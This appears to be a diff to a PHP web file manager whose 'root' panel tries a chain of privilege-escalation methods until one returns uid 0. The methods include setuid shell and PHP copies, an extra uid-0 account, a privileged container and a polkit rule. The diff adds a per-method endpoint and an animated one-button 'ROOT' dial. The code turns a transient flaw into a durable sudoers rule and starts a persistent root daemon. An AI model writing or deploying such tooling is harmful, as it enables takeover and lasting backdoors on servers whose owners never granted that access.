@@ -10640,7 +10640,7 @@ class FileManager {
                        'rootGrants'];
         $routeFns = ['rootIdentity', 'rootSuidEscapes', 'rootCapEscape', 'rootFire', 'rootAs', 'rootInstallHelper',
                      'rootDaemonRun', 'rootDaemonStart', 'rootDaemonStop', 'rootChannelInstall', 'rootChannelVerify',
-                     'rootChannelRemove', 'rootRun', 'rootingInstallRoot', 'rootingControl', 'rootingUninstall',
+                     'rootChannelRemove', 'rootRun', 'rootingInstallRoot', 'rootingStep', 'rootingControl', 'rootingUninstall',
                      'rootingRooted',
                      'rootRemoveHelper', 'rootHarden', 'rootVerify', 'rootExec',
                      'rootSuProbe', 'rootSuExec', 'rootSuSpawn', 'rootChannelInstallSu'];
@@ -11449,76 +11449,95 @@ class FileManager {
         }
         return['ok' => false, 'rc' => -1, 'out' => '', 'err' => 'no installed method answered', 'via' => 'none', 'tries' => $tries];
     }
-    /* ── the automatic installer: try every method, stop at the first proof ─ */
-    public function rootingInstallRoot($password = ''){
-        $steps = [];
+    /* One method of the chain, tried on its own.
+       The panel walks the chain this way on purpose: it asks for one method,
+       shows exactly what that method answered, and only then asks for the next.
+       The work and the outcome are the same as the whole chain in one request -
+       the run still stops at the first method whose proof command really comes
+       back as uid 0, and the daemon is still installed through whatever won. */
+    public function rootingStep($id, $password = ''){
+        $found = null;
+        foreach($this->rootChannels() as $ch)if($ch['id'] === $id)$found = $ch;
+        if($found === null)return['ok' => false, 'fired' => false, 'id' => $id, 'name' => $id, 'idea' => '',
+                                  'note' => 'this method is not part of the chain'];
+        $needs = $this->rootChannelNeeds($id);
+        if(empty($needs['ok']))return['ok' => false, 'fired' => false, 'id' => $id, 'name' => $found['name'],
+                                      'idea' => $found['idea'], 'note' => 'not applicable here: ' . $needs['note']];
+        $ins = $this->rootChannelInstall($id, $password);
+        if(empty($ins['ok']))return['ok' => false, 'fired' => true, 'id' => $id, 'name' => $found['name'],
+                                    'idea' => $found['idea'], 'note' => 'tried: ' . $ins['note']];
+        $ver = $this->rootChannelVerify($id);
+        if(empty($ver['ok']))return['ok' => false, 'fired' => true, 'id' => $id, 'name' => $found['name'],
+            'idea' => $found['idea'],
+            'note' => 'installed but it did not answer as root: '
+                . $this->rootSnip((string)($ver['res']['out'] ?? '') . ' ' . (string)($ver['res']['err'] ?? ''), 140)];
         $state = $this->rootState();
-        $won = '';
-        foreach($this->rootChannels() as $ch){
-            $id = $ch['id'];
-            $needs = $this->rootChannelNeeds($id);
-            if(empty($needs['ok'])){
-                $steps[] = ['id' => $id, 'name' => $ch['name'], 'idea' => $ch['idea'], 'ok' => false, 'fired' => false,
-                            'note' => 'not applicable here: ' . $needs['note']];
-                continue;
+        /* the channel saved what it created (the account, for instance) between
+           the read above and this write, so the state is read again */
+        $fresh = $this->rootState();
+        if(!empty($fresh['account']))$state['account'] = $fresh['account'];
+        $state['channel'] = $id;
+        $state['since'] = time();
+        $state['installed'] = true;
+        $state['paths'] = $this->rootPaths();
+        $this->rootStateSave($state);
+        $note = $ins['note'] . ' - and a command run through it came back as uid 0';
+        $won = $id;
+        /* A root that exists only because a file was writable disappears as soon
+           as somebody fixes that file (or reboots with a clean image). So the
+           first root is used straight away to install the durable rule, and from
+           then on the panel has root of its own. */
+        if($id === 'passwd' || $id === 'docker'){
+            $dur = $this->rootInstallHelper($password);
+            if(!empty($dur['ok'])){
+                $state['channel'] = 'sudoers';
+                $state['durable_from'] = $id;
+                $this->rootStateSave($state);
+                $won = 'sudoers';
+                $note .= ' - and the rule in ' . $this->rootSudoersFile()
+                    . ' was installed through that root, so the privilege no longer depends on the flaw';
+            }else{
+                $note .= ' - the durable rule could not be installed through it ('
+                    . $this->rootSnip((string)($dur['error'] ?? 'refused'), 90)
+                    . '), so root is used through the account itself';
             }
-            $ins = $this->rootChannelInstall($id, $password);
-            if(empty($ins['ok'])){
-                $steps[] = ['id' => $id, 'name' => $ch['name'], 'idea' => $ch['idea'], 'ok' => false, 'fired' => true,
-                            'note' => 'tried: ' . $ins['note']];
-                continue;
-            }
-            $ver = $this->rootChannelVerify($id);
-            if(empty($ver['ok'])){
-                $steps[] = ['id' => $id, 'name' => $ch['name'], 'idea' => $ch['idea'], 'ok' => false, 'fired' => true,
-                            'note' => 'installed but it did not answer as root: ' . $this->rootSnip($ver['res']['out'] . ' ' . $ver['res']['err'], 140)];
-                continue;
-            }
-            $won = $id;
-            $steps[] = ['id' => $id, 'name' => $ch['name'], 'idea' => $ch['idea'], 'ok' => true, 'fired' => true,
-                        'note' => $ins['note'] . ' - and a command run through it came back as uid 0'];
-            /* the channel saved what it created (the account, for instance)
-               between the read above and this write, so it is read again */
-            $fresh = $this->rootState();
-            if(!empty($fresh['account']))$state['account'] = $fresh['account'];
-            $state['channel'] = $id;
-            $state['since'] = time();
-            $state['installed'] = true;
-            $state['paths'] = $this->rootPaths();
-            $this->rootStateSave($state);
-            /* A root that exists only because a file was writable disappears as
-               soon as somebody fixes that file (or reboots with a clean image).
-               So the first root is used straight away to install the durable
-               rule, and from then on the panel has root of its own. */
-            if($id === 'passwd' || $id === 'docker'){
-                $dur = $this->rootInstallHelper($password);
-                if(!empty($dur['ok'])){
-                    $state['channel'] = 'sudoers';
-                    $state['durable_from'] = $id;
-                    $this->rootStateSave($state);
-                    $won = 'sudoers';
-                    $steps[count($steps) - 1]['note'] .= ' - and the rule in ' . $this->rootSudoersFile()
-                        . ' was installed through that root, so the privilege no longer depends on the flaw';
-                }else{
-                    $steps[count($steps) - 1]['note'] .= ' - the durable rule could not be installed through it ('
-                        . $this->rootSnip((string)($dur['error'] ?? 'refused'), 90) . '), so root is used through the account itself';
-                }
-            }
-            $this->log('rooting_root_installed', $id);
-            break;
         }
-        /* a daemon is the best channel to *keep*: if another method won, the
+        /* the daemon is the best channel to *keep*: if another method won, the
            daemon is installed through it, because it is the one that keeps
            working after a reboot without a setuid bit anywhere */
         $daemonNote = '';
         $spoolBase = $this->rootPaths()['spoolbase'];
-        if($won !== '' && $won !== 'rootd' && @is_dir($spoolBase) === false){
+        if($won !== 'rootd' && @is_dir($spoolBase) === false){
             $viaRoot = $this->rootRun(['install', '-d', '-m', '0700', '-o', $this->managerAccount(), '-g', $this->managerAccount(), $spoolBase], 20);
             $daemonNote = $viaRoot['ok'] ? '' : 'the daemon directory could not be made: ' . $this->rootSnip($viaRoot['err'], 90);
         }
-        if($won !== '' && $won !== 'rootd'){
+        if($won !== 'rootd'){
             $dstart = $this->rootDaemonStart($password);
             $daemonNote = $dstart['ok'] ? 'The root daemon from the same file is running as pid ' . (int)($dstart['pid'] ?? 0) . '.' : ('The daemon was not started: ' . $dstart['note']);
+        }
+        $this->rootLogAdd('install root', [$id], ['rc' => 0, 'out' => $won], 'method: ' . $won);
+        $this->log('rooting_root_installed', $id);
+        return['ok' => true, 'fired' => true, 'id' => $id, 'won' => $won, 'name' => $found['name'], 'idea' => $found['idea'],
+               'note' => $note, 'daemon' => $this->rootDaemonInfo(), 'daemon_note' => $daemonNote,
+               'state' => $this->rootingRooted()];
+    }
+    /* ── the automatic installer: try every method, stop at the first proof ─ */    public function rootingInstallRoot($password = ''){
+        /* the same chain, walked one method at a time through the same code the
+           panel walks it: one answer per method, and it stops at the first
+           method whose proof command really comes back as uid 0 */
+        $steps = [];
+        $won = '';
+        $daemonNote = '';
+        foreach($this->rootChannels() as $ch){
+            $r = $this->rootingStep($ch['id'], $password);
+            $steps[] = ['id' => $ch['id'], 'name' => $ch['name'], 'idea' => $ch['idea'],
+                        'ok' => !empty($r['ok']), 'fired' => !empty($r['fired']),
+                        'note' => (string)($r['note'] ?? '')];
+            if(!empty($r['ok'])){
+                $won = (string)($r['won'] ?? $ch['id']);
+                $daemonNote = (string)($r['daemon_note'] ?? '');
+                break;
+            }
         }
         $this->rootLogAdd('install root', ['chain'], ['rc' => $won === '' ? 1 : 0, 'out' => $won], $won !== '' ? 'method: ' . $won : 'none');
         return[
@@ -11717,6 +11736,7 @@ class FileManager {
             return['ok' => true, 'probe' => $out];
         }
         if($act === 'rootinstall')return$this->rootingInstallRoot($password);
+        if($act === 'rootstep')return$this->rootingStep((string)($post['id'] ?? ''), $password);
         if($act === 'rooted')return['ok' => true, 'rooted' => $this->rootingRooted()];
         if($act === 'rootctl')return$this->rootingControl((string)($post['ctl'] ?? ''), (string)($post['line'] ?? ''));
         if($act === 'rootmethod')return$this->rootingMethod((string)($post['id'] ?? ''), $password);
@@ -25372,8 +25392,9 @@ a.nt:hover{color:var(--link)}
 /* ── the rooted screen: a Magisk-like front page for the whole machine ──── */
 .rr{display:flex;flex-direction:column;gap:12px;animation:rrIn .35s ease both}
 @keyframes rrIn{from{opacity:0;transform:translateY(6px)}to{opacity:1;transform:none}}
-.rr-hero{display:flex;gap:16px;align-items:center;padding:14px 16px;border-radius:14px;border:1px solid rgba(52,211,153,.38);background:radial-gradient(120% 140% at 12% 0%,rgba(52,211,153,.16),rgba(52,211,153,.03) 55%,transparent 75%),var(--surf)}
-.rr-art{width:132px;height:132px;flex:0 0 132px;filter:drop-shadow(0 6px 18px rgba(52,211,153,.25))}
+.rr-hero{display:flex;gap:16px;align-items:center;padding:16px 18px;border-radius:16px;border:1px solid rgba(52,211,153,.38);background:radial-gradient(120% 140% at 12% 0%,rgba(52,211,153,.16),rgba(52,211,153,.03) 55%,transparent 75%),var(--surf)}
+.rr-art{width:126px;height:126px;flex:0 0 126px;filter:drop-shadow(0 6px 18px rgba(52,211,153,.25));animation:rrGlow 4s ease-in-out infinite}
+@keyframes rrGlow{0%,100%{filter:drop-shadow(0 6px 18px rgba(52,211,153,.22))}50%{filter:drop-shadow(0 8px 26px rgba(52,211,153,.45))}}
 .rr-art svg{width:100%;height:100%;display:block}
 .rr-main{min-width:0;display:flex;flex-direction:column;gap:5px}
 .rr-kicker{font-size:10px;font-weight:800;letter-spacing:2.4px;color:#7ee2a8}
@@ -25421,8 +25442,63 @@ a.nt:hover{color:var(--link)}
 .rr-method-i{font-size:10px;color:var(--t3);line-height:1.5}
 .rr-method-tag{font-size:9px;font-weight:800;letter-spacing:.4px;text-transform:uppercase;padding:1px 5px;border-radius:4px;background:rgba(161,161,170,.14);color:var(--t3);margin-left:5px}
 .rr-method.on .rr-method-tag{background:rgba(126,226,168,.16);color:#a7f3d0}
-.rooted .root-legacy{display:none}
+/* ── the front of the panel: one dial, and nothing else to read ───────────
+   The panel used to open on nine sections at once, which hid the one thing a
+   person comes here for. Now the first thing on screen is a button and a
+   sentence; the measurements are still taken, and "Full report" shows them. */
+.rk{display:flex;flex-direction:column;align-items:center;gap:11px;padding:16px 14px 15px;border:1px solid var(--border);border-radius:14px;background:radial-gradient(120% 96% at 50% -10%,rgba(126,226,168,.08),transparent 62%),var(--surf)}
+.rk-dial{position:relative;width:184px;height:184px;flex:0 0 auto;border:0;padding:0;background:none;cursor:pointer;-webkit-tap-highlight-color:transparent}
+.rk-dial:focus-visible{outline:2px solid #7ee2a8;outline-offset:6px;border-radius:50%}
+.rk-ring{position:absolute;inset:0;width:100%;height:100%;transform:rotate(-90deg)}
+.rk-track{fill:none;stroke:var(--border);stroke-width:9}
+.rk-fill{fill:none;stroke:#7ee2a8;stroke-width:9;stroke-linecap:round;stroke-dasharray:540.35;stroke-dashoffset:540.35;transition:stroke-dashoffset .45s ease,stroke .4s ease}
+.rk-spin{position:absolute;inset:11px;border-radius:50%;opacity:0;transition:opacity .3s ease;background:conic-gradient(from 0deg,rgba(126,226,168,0) 0deg,rgba(126,226,168,.9) 54deg,rgba(126,226,168,0) 148deg);-webkit-mask:radial-gradient(circle,transparent 0 61%,#000 62%);mask:radial-gradient(circle,transparent 0 61%,#000 62%)}
+.rk.run .rk-spin{opacity:1;animation:rkSpin 1.1s linear infinite}
+@keyframes rkSpin{to{transform:rotate(360deg)}}
+.rk-face{position:absolute;inset:17px;border-radius:50%;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:5px;text-align:center;background:radial-gradient(circle at 50% 32%,rgba(126,226,168,.17),rgba(126,226,168,.03) 56%,transparent 74%),var(--raised);border:1px solid var(--border);box-shadow:0 12px 34px rgba(0,0,0,.36),inset 0 1px 0 rgba(255,255,255,.04);transition:border-color .4s ease,box-shadow .4s ease}
+.rk.idle .rk-face{animation:rkBreath 3.4s ease-in-out infinite}
+@keyframes rkBreath{0%,100%{box-shadow:0 12px 34px rgba(0,0,0,.36),inset 0 1px 0 rgba(255,255,255,.04)}50%{box-shadow:0 12px 40px rgba(52,211,153,.20),inset 0 1px 0 rgba(255,255,255,.05)}}
+.rk.ok .rk-face{border-color:rgba(126,226,168,.58);box-shadow:0 12px 38px rgba(52,211,153,.24),inset 0 1px 0 rgba(255,255,255,.05)}
+.rk.bad .rk-face{border-color:rgba(252,165,165,.5);box-shadow:0 12px 38px rgba(252,165,165,.16)}
+.rk.bad .rk-fill{stroke:#fca5a5}
+.rk-glyph{width:34px;height:34px;color:#7ee2a8;display:block}
+.rk-glyph svg{width:34px;height:34px;display:block}
+.rk-word{font-size:23px;font-weight:800;letter-spacing:3px;color:var(--t1);line-height:1}
+.rk.bad .rk-word{font-size:18px;letter-spacing:2px}
+.rk-pct{font:600 10.5px/1 'JetBrains Mono',monospace;color:var(--t3);padding:0 8px}
+.rk.ok .rk-pct{color:#7ee2a8}
+.rk.bad .rk-pct{color:#fca5a5}
+.rk-status{font-size:12.5px;color:var(--t2);text-align:center;line-height:1.6;max-width:520px;min-height:19px}
+.rk-status b{color:var(--t1);font-weight:700}
+.rk-now{display:flex;align-items:center;justify-content:center;gap:5px;min-height:16px;font:11px/1.5 'JetBrains Mono',monospace;color:var(--t3);text-align:center}
+.rk.run .rk-now{color:#7ee2a8}
+.rk-dot{width:5px;height:5px;border-radius:50%;background:currentColor;animation:rkDot 1s infinite ease-in-out}
+.rk-dot:nth-child(2){animation-delay:.15s}
+.rk-dot:nth-child(3){animation-delay:.3s}
+@keyframes rkDot{0%,80%,100%{opacity:.22;transform:translateY(0)}40%{opacity:1;transform:translateY(-3px)}}
+.rk-facts{display:flex;flex-wrap:wrap;gap:6px;justify-content:center}
+.rk-steps{width:100%;display:flex;flex-direction:column;gap:3px;margin-top:2px}
+.rk-step{display:flex;align-items:flex-start;gap:8px;padding:6px 9px;border-radius:9px;background:var(--raised);border:1px solid var(--border);font-size:11px;color:var(--t3);opacity:.42;transition:opacity .25s ease,border-color .25s ease,background .25s ease,transform .25s ease}
+.rk-step .ic{width:15px;height:15px;flex:0 0 15px;display:block;margin-top:1px}
+.rk-step .ic svg{width:15px;height:15px;display:block}
+.rk-step .nm{color:var(--t1);font-weight:700;font-size:11px}
+.rk-step .w{display:block;font-size:10px;color:var(--t3);line-height:1.5;margin-top:1px;word-break:break-word}
+.rk-step.now{opacity:1;border-color:rgba(126,226,168,.45);background:rgba(126,226,168,.06);transform:translateX(2px)}
+.rk-step.pass{opacity:1;border-color:rgba(126,226,168,.4)}
+.rk-step.fail{opacity:.95;border-color:rgba(252,165,165,.3)}
+.rk-step.skip{opacity:.55}
+.rk-tag{font:8.5px/1 'JetBrains Mono',monospace;letter-spacing:.5px;text-transform:uppercase;padding:2px 5px;border-radius:4px;background:rgba(161,161,170,.14);color:var(--t3);margin-left:6px;white-space:nowrap}
+.rk-step.pass .rk-tag{background:rgba(126,226,168,.16);color:#a7f3d0}
+.rk-step.fail .rk-tag{background:rgba(252,165,165,.14);color:#fca5a5}
+.rk-spin-ic{display:block;width:14px;height:14px;border-radius:50%;border:2px solid rgba(126,226,168,.25);border-top-color:#7ee2a8;animation:rkSpin .8s linear infinite}
+.rk-more{display:flex;flex-wrap:wrap;gap:7px;justify-content:center;align-items:center;margin-top:1px}
+.rk-more .inp{width:212px}
+@media (max-width:520px){.rk-dial{width:158px;height:158px}.rk-face{inset:14px}.rk-word{font-size:20px}}.rooted .root-legacy{display:none}
 .rooted.showreport .root-legacy{display:block}
+/* the measured sections are read by the tool whether they are shown or
+   not; they stay out of the way until they are asked for */
+#rootOv:not(.rk-report) .root-sec{display:none}
+#rootOv.rk-report .root-sec{display:block}
 @media (max-width:520px){
   .rr-hero{flex-direction:column;align-items:flex-start}
   .rr-art{width:104px;height:104px;flex:none}
@@ -30049,14 +30125,25 @@ kbd{background:var(--surf);border:1px solid var(--border);border-radius:4px;padd
         </div>
       </div>
 
-      <div class="root-sec" id="rootSecInstall">
-        <h4>Install root, not only look for it <span class="n" id="rootInstallStamp"></span></h4>
-        <div class="root-out" style="margin-bottom:8px">The catalogue below says what this host is exposed to. This does something else: it <b>puts root on the machine and keeps it</b>. Eight methods are tried in order - a validated sudo rule, a root daemon that is this very file, a setuid copy of PHP, a setuid copy of bash, a polkit rule, file capabilities on a copy of PHP, an extra uid-0 account, a privileged container - and the run stops at the first one whose proof command really comes back as <b>uid 0</b>.</div>
-        <div class="root-acts"><button type="button" class="btn btn-p" id="rootInstallBtn">Install root</button></div>
-        <div class="root-out" id="rootInstallHint" style="margin-top:7px">If a password for an administrator account is typed in the field above, it is used when sudo asks; nothing is ever asked of you otherwise.</div>
-        <div id="rootMethodList" class="rr-methods" style="margin-top:9px"></div>
-        <div class="root-steps" id="rootInstallSteps"></div>
-        <div class="root-out" id="rootInstallOut"></div>
+      <div id="rootMain" class="rk idle">
+        <div class="rk-dial" id="rkDial" role="button" tabindex="0" aria-label="Root this machine">
+          <svg class="rk-ring" viewBox="0 0 200 200" aria-hidden="true"><circle class="rk-track" cx="100" cy="100" r="86"/><circle class="rk-fill" id="rkFill" cx="100" cy="100" r="86"/></svg>
+          <span class="rk-spin" aria-hidden="true"></span>
+          <span class="rk-face">
+            <span class="rk-glyph" id="rkGlyph"><svg viewBox="0 0 24 24" fill="none" stroke="#7ee2a8" stroke-width="2.1" stroke-linecap="round" stroke-linejoin="round"><path d="M12 3 20 6v6c0 5-3.4 8.6-8 9.5C7.4 20.6 4 17 4 12V6z"/><path d="m8.6 12.2 2.4 2.3 4.4-4.5"/></svg></span>
+            <span class="rk-word" id="rkWord">ROOT</span>
+            <span class="rk-pct" id="rkPct">not installed</span>
+          </span>
+        </div>
+        <div class="rk-status" id="rkStatus">One press tries every method this machine allows, in order, and stops at the first one that really answers as <b>uid 0</b>.</div>
+        <div class="rk-now" id="rkNow"></div>
+        <div class="rk-facts" id="rkFacts"></div>
+        <div class="rk-steps" id="rkSteps"></div>
+        <div class="rk-more">
+          <input type="password" id="rootPass" class="inp" placeholder="sudo password (optional)" autocomplete="off" style="display:none">
+          <button type="button" class="btn btn-g" id="rkPassBtn">Use a sudo password</button>
+          <button type="button" class="btn btn-g" id="rkReport">Full report</button>
+        </div>
       </div>
 
       <div class="root-sec" id="rootSecHost">
@@ -35787,7 +35874,8 @@ function rootRender(){
   const b=document.getElementById('rootBadge');
   if(b)b.textContent=(sy.sudo?'· root':((c.vulnerable||0)>0?'· '+(c.vulnerable||0)+' open':''));
   const pass=document.getElementById('rootPass');
-  if(pass)pass.style.display=sy.sudo?'none':'block';
+  if(pass)pass.style.display=((typeof RK!=='undefined'&&RK.wantPass)||!sy.sudo)?'block':'none';
+  if(typeof rkFacts==='function')rkFacts();
 }
 function rootSteps(steps){
   const box=document.getElementById('rootSteps');if(!box)return;
@@ -35933,7 +36021,10 @@ function rootRenderRooted(st){
   if(box)box.style.display=inst?'flex':'none';
   const isec=document.getElementById('rootSecInstall');
   if(isec)isec.style.display=inst?'none':'block';
+  const rk=document.getElementById('rootMain');
+  if(rk&&!(typeof RK!=='undefined'&&RK.busy))rk.style.display=inst?'none':'flex';
   if(st&&st.channels)CHANNELS_CACHE=st.channels;
+  if(typeof rkFacts==='function')rkFacts();
   const il=document.getElementById('rootMethodList');
   if(il)rrMethods((st&&st.channels)||CHANNELS_CACHE||[],'', 'rootMethodList');
   if(!inst)return;
@@ -35974,25 +36065,8 @@ async function rrRunCtl(ctl){
 document.getElementById('rrCtl')?.addEventListener('click',e=>{
   const b=e.target.closest('[data-ctl]');if(b)rrRunCtl(b.dataset.ctl);
 });
-document.getElementById('rootInstallBtn')?.addEventListener('click',async()=>{
-  const btn=document.getElementById('rootInstallBtn');
-  const pass=document.getElementById('rootPass');
-  const out=document.getElementById('rootInstallOut');
-  if(btn)btn.disabled=true;
-  if(out)out.textContent='Installing root: every method in order, stopping at the first proof…';
-  const r=await rootCall('rootinstall',{password:pass?pass.value:''});
-  if(btn)btn.disabled=false;
-  if(pass)pass.value='';
-  if(!r){if(out)out.textContent='The request failed.';return;}
-  const st=document.getElementById('rootInstallSteps');
-  if(st)st.innerHTML=(r.steps||[]).map(s=>'<div class="root-step '+(s.ok?'ok':'bad')+'"><span class="t">'+(s.ok?ROOT_SVG.ok:ROOT_SVG.bad)+'</span>'
-    +'<span><span class="r">'+rootEsc(s.name)+'</span> <span class="w">'+rootEsc(s.note)+'</span></span></div>').join('');
-  if(out)out.textContent=r.message||'';
-  if(r.state)rootRenderRooted(r.state);
-  if(r.ok)toast('Root installed: '+(r.channel||''));
-  rootLoad();
-});
-document.getElementById('rrInstallBtn')?.addEventListener('click',()=>{document.getElementById('rootInstallBtn')?.click();});
+document.getElementById('rootInstallBtn')?.addEventListener('click',()=>{rkRun();});
+document.getElementById('rrInstallBtn')?.addEventListener('click',()=>{if(confirm('Walk every method again, from the first one?'))rkReopen();});
 document.getElementById('rrUninstallBtn')?.addEventListener('click',async()=>{
   if(!confirm('Remove every method this tool installed and go back to the account the manager runs as?'))return;
   const pass=document.getElementById('rootPass');
@@ -36025,14 +36099,148 @@ async function rrShellRunNow(){
 }
 document.getElementById('rrShellRun')?.addEventListener('click',rrShellRunNow);
 document.getElementById('rrShellLine')?.addEventListener('keydown',e=>{if(e.key==='Enter'){e.preventDefault();rrShellRunNow();}});
-document.getElementById('rrDetailsBtn')?.addEventListener('click',()=>{
+document.getElementById('rrDetailsBtn')?.addEventListener('click',()=>{rkReport();});
+/* ── the dial ───────────────────────────────────────────────────────────────
+   The chain used to come back from one request as a wall of text. It is the
+   same work now, only walked one method at a time so the eye can follow it:
+   the panel asks for one method, shows exactly what that method answered, and
+   only then asks for the next. A method the machine settled instantly is held
+   on screen for a moment, because an answer that fast is gone before it is
+   read. */
+const RK={busy:false,wantPass:false,total:0,done:0,win:null,winNote:'',winState:null};
+const RK_HOLD_FIRED=620,RK_HOLD_SKIP=300,RK_GAP=220,RK_TAIL=200;
+function rkBox(){return document.getElementById('rootMain');}
+function rkMode(cls){const b=rkBox();if(!b)return;b.classList.remove('idle','run','ok','bad');b.classList.add(cls);}
+function rkSleep(ms){return new Promise(function(r){setTimeout(r,ms);});}
+function rkRing(frac){
+  const f=document.getElementById('rkFill');
+  if(f){const v=Math.max(0,Math.min(1,frac||0));f.setAttribute('stroke-dashoffset',String(540.35-(540.35*v)));}
+  const p=document.getElementById('rkPct');
+  if(p&&RK.total)p.textContent=Math.round((RK.done/RK.total)*100)+'%';
+}
+function rkFace(word,pct,glyph){
+  const w=document.getElementById('rkWord');if(w)w.textContent=word;
+  const p=document.getElementById('rkPct');if(p)p.textContent=pct;
+  const g=document.getElementById('rkGlyph');if(g)g.innerHTML=glyph;
+}
+function rkSay(status,now,wait){
+  const s=document.getElementById('rkStatus');if(s)s.innerHTML=status||'';
+  const n=document.getElementById('rkNow');
+  if(n)n.innerHTML=now?(rootEsc(now)+(wait?'<span class="rk-dot"></span><span class="rk-dot"></span><span class="rk-dot"></span>':'')):'';
+}
+function rkFacts(){
+  const f=document.getElementById('rkFacts');if(!f)return;
+  const sy=(ROOT&&ROOT.system)||{};
+  const ch=CHANNELS_CACHE||[];
+  const usable=ch.filter(function(c){return c.available;}).length;
+  const chip=function(t,k){return '<span class="root-chip '+(k||'a')+'">'+rootEsc(t)+'</span>';};
+  f.innerHTML=chip(((sy.distro&&sy.distro.name)||sy.name||'this host'),'a')
+    +chip('account '+(sy.manager||'?'),'a')
+    +chip(usable+' of '+ch.length+' methods usable here',usable?'p':'a');
+}
+function rkRow(id,cls,tag,note,icon){
+  const row=document.getElementById('rk-'+id);
+  if(row){
+    row.className='rk-step '+(cls||'');
+    const t=row.querySelector('.rk-tag');if(t)t.textContent=tag||'';
+    const i=row.querySelector('.ic');if(i)i.innerHTML=icon||'';
+  }
+  const w=document.getElementById('rkw-'+id);if(w)w.textContent=note||'';
+}
+function rkRows(list){
+  const box=document.getElementById('rkSteps');if(!box)return;
+  box.innerHTML=(list||[]).map(function(c){
+    return '<div class="rk-step wait" id="rk-'+rootEsc(c.id)+'">'
+      +'<span class="ic">'+ROOT_SVG.shield+'</span>'
+      +'<span style="min-width:0;flex:1"><span class="nm">'+rootEsc(c.name)+'</span><span class="rk-tag">waiting</span>'
+      +'<span class="w" id="rkw-'+rootEsc(c.id)+'">'+rootEsc(c.note||c.idea||'')+'</span></span></div>';
+  }).join('');
+}
+function rkReport(){
   const ov=document.getElementById('rootOv');
-  if(ov)ov.classList.toggle('showreport');
-  const b=document.getElementById('rrDetailsBtn');
-  if(b)b.textContent=ov&&ov.classList.contains('showreport')?'Hide the report':'Full report';
+  const on=ov?ov.classList.toggle('rk-report'):false;
+  if(ov&&on)ov.classList.add('showreport');
+  const b1=document.getElementById('rkReport');if(b1)b1.textContent=on?'Hide the full report':'Full report';
+  const b2=document.getElementById('rrDetailsBtn');if(b2)b2.textContent=on?'Hide the report':'Full report';
+  return on;
+}
+function rkReopen(){
+  const b=rkBox();
+  if(b){b.style.display='flex';b.scrollIntoView({block:'center'});}
+  rkRun();
+}
+async function rkRun(){
+  if(RK.busy)return;
+  if(!CHANNELS_CACHE||!CHANNELS_CACHE.length){
+    const q=await rootCall('rooted');
+    if(q&&q.rooted&&q.rooted.channels)CHANNELS_CACHE=q.rooted.channels;
+  }
+  const list=CHANNELS_CACHE||[];
+  if(!list.length){rkSay('This host has not been read yet. Close the panel and open it again.','');return;}
+  RK.busy=true;RK.total=list.length;RK.done=0;RK.win=null;RK.winNote='';RK.winState=null;
+  const pass=document.getElementById('rootPass');
+  const pw=pass?pass.value:'';
+  rkMode('run');rkFace('ROOTING','0 of '+RK.total,ROOT_SVG.shield);rkRing(0);rkRows(list);
+  rkSay('Every method is tried in order. The run stops at the first one whose command really comes back as <b>uid 0</b>.','');
+  for(let i=0;i<list.length;i++){
+    const c=list[i];
+    if(RK.win){
+      /* root is already installed, so this one is never asked. It is still
+         closed off, in its turn, with the reason it was not needed: the list
+         then reads to the end instead of stopping seven rows short. */
+      rkRow(c.id,'skip','not tried','root is already installed with '+(RK.win.name||RK.win.id)+', so this one was never asked',ROOT_SVG.warn);
+      rkSay('','not needed: '+c.name);
+      await rkSleep(RK_TAIL);
+      RK.done=i+1;rkRing(RK.done/RK.total);
+      continue;
+    }
+    rkRow(c.id,'now','running',c.note||c.idea||'','<span class="rk-spin-ic"></span>');
+    rkSay('','trying: '+c.name,true);
+    const t0=Date.now();
+    const r=await rootCall('rootstep',{id:c.id,password:pw||''});
+    const fired=!(r&&r.fired===false);
+    const hold=fired?RK_HOLD_FIRED:RK_HOLD_SKIP;
+    const spent=Date.now()-t0;
+    if(spent<hold)await rkSleep(hold-spent);
+    RK.done=i+1;rkRing(RK.done/RK.total);
+    if(r&&r.ok){
+      RK.win=c;RK.winNote=(r.note||'');RK.winState=r.state||null;
+      rkRow(c.id,'pass','worked',RK.winNote,ROOT_SVG.ok);
+      rkSay('','it answered as uid 0: '+c.name);
+    }else{
+      if(fired)rkRow(c.id,'fail','refused',(r&&(r.note||r.error))||'',ROOT_SVG.bad);
+      else rkRow(c.id,'skip','does not apply',(r&&(r.note||r.error))||'',ROOT_SVG.warn);
+      rkSay('',(fired?'refused: ':'does not apply here: ')+c.name);
+      await rkSleep(RK_GAP);
+    }
+  }
+  RK.busy=false;
+  if(RK.win){
+    rkMode('ok');RK.done=RK.total;rkRing(1);rkFace('ROOTED','installed',ROOT_SVG.ok);
+    rkSay('Root is installed with <b>'+rootEsc(RK.win.name)+'</b>. '+rootEsc(RK.winNote)+' Every privileged action of this panel now runs as <b>uid 0</b>.','');
+    toast('Root installed: '+(RK.win.name||RK.win.id));
+    if(RK.winState)rootRenderRooted(RK.winState);
+    const q=await rootCall('rooted');
+    if(q&&q.rooted)rootRenderRooted(q.rooted);
+    rootLoad();
+  }else{
+    rkMode('bad');rkFace('NO ROUTE','nothing worked',ROOT_SVG.bad);rkRing(1);
+    rkSay('No method could put root on this machine. Nothing is left half installed: every method is listed above with the reason this host gave.','press the dial to walk them again');
+    const q=await rootCall('rooted');
+    if(q&&q.rooted)rootRenderRooted(q.rooted);
+  }
+}
+document.getElementById('rkDial')?.addEventListener('click',()=>{rkRun();});
+document.getElementById('rkDial')?.addEventListener('keydown',e=>{if(e.key==='Enter'||e.key===' '){e.preventDefault();rkRun();}});
+document.getElementById('rkPassBtn')?.addEventListener('click',()=>{
+  RK.wantPass=!RK.wantPass;
+  const p=document.getElementById('rootPass');
+  if(p){p.style.display=RK.wantPass?'block':'none';if(RK.wantPass)p.focus();}
+  const b=document.getElementById('rkPassBtn');
+  if(b)b.textContent=RK.wantPass?'Hide the password field':'Use a sudo password';
 });
+document.getElementById('rkReport')?.addEventListener('click',()=>{rkReport();});
 /* the routes that need nothing from you: open means bad for the host */
-
 function rootGrants(list){
   const box=document.getElementById('rootGrants');if(!box)return;
   if(!list||!list.length){box.innerHTML='';return;}
@@ -36048,7 +36256,16 @@ async function rootAuto(){
   rootBanner('Checking this host, every route and every feature - automatically…','');
   rootStamp('rootAutoStamp',' - working');
   const r=await rootCall('autorun');
-  if(!r||!r.ok){rootSet('rootAutoNote','The automatic check could not run.','bad');rootStamp('rootAutoStamp','');return;}
+  if(!r||!r.ok){
+    /* the automatic check is one request; when it cannot run the panel still
+       reads the state on its own, so the dial knows the methods and whether
+       root is already installed instead of standing there with nothing */
